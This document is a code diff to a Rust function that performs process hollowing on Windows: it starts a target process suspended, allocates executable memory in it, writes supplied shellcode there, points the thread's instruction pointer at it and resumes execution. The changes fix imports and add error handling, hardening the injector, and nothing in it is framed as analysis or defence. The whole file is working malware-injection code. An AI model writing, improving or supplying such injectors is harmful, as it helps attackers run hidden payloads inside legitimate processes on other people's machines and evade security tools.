@@ -1,7 +1,7 @@
 use std::ptr;
-use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, GetThreadContext, SetThreadContext, CONTEXT};
+use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, GetThreadContext, SetThreadContext};
 use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
-use winapi::um::winnt::{IMAGE_NT_HEADERS64, IMAGE_OPTIONAL_HEADER64, IMAGE_SECTION_HEADER, CONTEXT_FULL};
+use winapi::um::winnt::{CONTEXT, CONTEXT_FULL};
 use winapi::um::winbase::CREATE_SUSPENDED;
 
 // Process Hollowing: Replace target process memory with payload
@@ -31,11 +31,20 @@ pub unsafe fn hollow_process(target: &str, shellcode: &[u8]) {
 
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(h_thread, &mut ctx);
+    
+    if GetThreadContext(h_thread, &mut ctx) == 0 {
+        panic!("Failed to get thread context");
+    }
 
     // Allocate new memory for shellcode in remote process
     let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), 0x3000, 0x40);
-    WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const _, shellcode.len(), ptr::null_mut());
+    if addr.is_null() {
+        panic!("Failed to allocate memory in target process");
+    }
+
+    if WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const _, shellcode.len(), ptr::null_mut()) == 0 {
+        panic!("Failed to write shellcode into target process");
+    }
 
     // Modify Execution Flow
     #[cfg(target_arch = "x86_64")]
@@ -43,6 +52,11 @@ pub unsafe fn hollow_process(target: &str, shellcode: &[u8]) {
         ctx.Rip = addr as u64;
     }
 
-    SetThreadContext(h_thread, &ctx);
-    ResumeThread(h_thread);
+    if SetThreadContext(h_thread, &ctx) == 0 {
+        panic!("Failed to set thread context");
+    }
+
+    if ResumeThread(h_thread) == u32::MAX {
+        panic!("Failed to resume thread");
+    }
 }
